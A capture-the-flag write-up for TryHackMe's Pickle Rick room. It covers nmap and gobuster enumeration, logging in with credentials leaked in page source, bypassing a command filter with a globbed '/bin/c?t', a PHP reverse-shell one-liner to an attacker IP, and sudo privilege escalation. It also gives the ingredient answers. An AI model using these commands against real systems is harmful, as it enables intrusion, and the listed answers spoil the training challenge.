# Writeup Pickle Rick challenge (THM)

![logo_machine](https://tryhackme-images.s3.amazonaws.com/room-icons/47d2d3ade1795f81a155d0aca6e4da96.jpeg)

The following challenge is hosted by TryHackMe and aims at exploiting a web server in order to find three ingredients in order to help Rick, who wants to create a potion.
Let's begin.

## Target enumeration

As usual, we start analyzing the target by launching *nmap* command:
```
nmap -sV -A -T4 10.10.38.165 -oN nmap.txt
```
As a result we obtain that ports 22 (ssh) and 80 (http) are open.

Let's examine the website.

## Website

Inspecting the source code, we immediately find this comment:

*Note to self, remember username! Username: R1ckRul3s*

So, we jot down the username *R1ckRul3s*.

In the */robots.txt* page we find a mysterious string, i.e.: *Wubbalubbadubdub*.

If we try to connect to port 22 (ssh) using as username R1ckRul3s and as password Wubbalubbadubdub doesn't work (permission denied), so we need to discover where these credentials can be used.
So, we launch *gobuster* in order to discover other potential paths, we the following command (note the *x* option, where we look for files with php extension, too):

```
gobuster -w <path/to/wordlist/>directory-list-2.3-small.txt -u http://<target_ip>/ -t 20 -x php
```

As a result we obtain these paths:

* /login.php (Status: 200)
* /assets (Status: 301)
* /portal.php (Status: 302)


Yep! We found the place to insert the above-mentioned credentials: *login.php*.

![img3](/images/pickle_rick-thm/img3.png?raw=true)


## First ingredient

Once logged in, we land in a web page with a menu with some options on the top. The most interesting tab is *Commands*. Indeed, here we can find an input form, where we can run shell commands.

For example, if we type the ```ls``` command, we can get the following results:
* **Sup3rS3cretPickl3Ingred.txt**
* assets
* clue.txt
* denied.php
* index.html
* login.php
* portal.php
* robots.txt

Immediately, we notice the Sup3rS3cretPickl3Ingred.txt file. However, if we try to cat it, a filter is placed:

![img4](/images/pickle_rick-thm/img4.png?raw=true)


In order to bypass it, we used metacharacters for pattern matching ([link](https://www.linux.com/topic/desktop/introduction-regular-expressions-new-linux-users/)). For example, with this command we can retrieve the data in the file:

```
/bin/c?t Sup3rS3cretPickl3Ingred.txt
```

![img5](/images/pickle_rick-thm/img5.png?raw=true):

Great! First flag found.


## Second ingredient

* read *clue.txt* file with ```/bin/c?t clue.txt``` and it states:
*Look around the file system for the other ingredient.*

* in */home/rick* there is *second ingredients* file (```ls -l /home/rick```)

* lets cat it: ```/bin/c?t "/home/rick/second ingredients"``` (fai reference a livello
  di bandit in cui spiego come si fa cat in file che contiene spazie nel nome)

  2nd ingredient: 1 jerry tear

## Third ingredient

* rev shell using php

![img6](/images/pickle_rick-thm/img6.png?raw=true):

```
php -r '$sock=fsockopen("10.8.12.35",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

* cat php files in order to understand how to open other tabs in portal.php page

* use ```sudo -l``` to priv esc, result:
```
$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-100-151.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-100-151.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```
so all the commands can be run by www-data

* then:

![img7](/images/pickle_rick-thm/img7.png?raw=true)

3rd ingredient: fleeb juice
